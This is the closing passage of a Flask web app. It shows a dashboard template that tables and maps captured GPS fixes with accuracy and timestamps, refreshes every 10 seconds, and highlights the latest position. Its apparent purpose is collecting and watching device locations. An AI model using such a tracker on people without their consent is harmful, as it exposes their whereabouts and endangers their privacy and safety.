          {% else %}
          <td style="color:var(--muted);">Pending</td>
          {% endif %}
          <td>
            {% if c.latitude %}
            <a class="map-link"
               href="https://www.google.com/maps?q={{ c.latitude }},{{ c.longitude }}"
               target="_blank">Open ↗</a>
            {% else %}—{% endif %}
          </td>
        </tr>
        {% else %}
        <tr><td colspan="7" style="text-align:center;color:var(--muted);padding:30px;">
          No GPS data yet
        </td></tr>
        {% endfor %}
      </tbody>
    </table>
  </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
var captures = {{ captures_json | safe }};
var validFixes = captures.filter(function(c){ return c.lat !== null; });

if (validFixes.length > 0) {
  var map = L.map('map');
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap'
  }).addTo(map);

  var redIcon = L.icon({
    iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
    shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
    iconSize: [25,41], iconAnchor: [12,41], popupAnchor: [1,-34]
  });
  var blueIcon = L.icon({
    iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
    shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
    iconSize: [25,41], iconAnchor: [12,41], popupAnchor: [1,-34]
  });

  /* Draw line through all fixes */
  if (validFixes.length > 1) {
    var latlngs = validFixes.map(function(c){ return [c.lat, c.lng]; });
    L.polyline(latlngs, { color:'#3b82f6', weight:2, opacity:.6 }).addTo(map);
  }

  validFixes.forEach(function(c, i) {
    var isLatest = (i === 0);
    var marker = L.marker([c.lat, c.lng], { icon: isLatest ? redIcon : blueIcon }).addTo(map);
    marker.bindPopup(
      '<b>' + (isLatest ? '🔴 Latest Fix' : 'Fix #' + (i+1)) + '</b><br>' +
      c.lat.toFixed(5) + ', ' + c.lng.toFixed(5) + '<br>' +
      '±' + Math.round(c.acc || 0) + 'm<br>' +
      '<small>' + c.ts.replace('T',' ').slice(0,19) + ' UTC</small>'
    );
    if (isLatest) marker.openPopup();
  });

  var bounds = validFixes.map(function(c){ return [c.lat, c.lng]; });
  map.fitBounds(bounds, { padding:[40,40], maxZoom:16 });
} else {
  document.getElementById('map').innerHTML =
    '<div style="display:flex;align-items:center;justify-content:center;' +
    'height:100%;color:#64748b;font-family:system-ui;font-size:14px;">' +
    '📍 No GPS data to display yet</div>';
}

/* Auto-refresh every 10 s */
setTimeout(function(){ window.location.reload(); }, 10000);
</script>
</body>
</html>"""


# ─── Startup ──────────────────────────────────────────────────────────────────

init_db()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
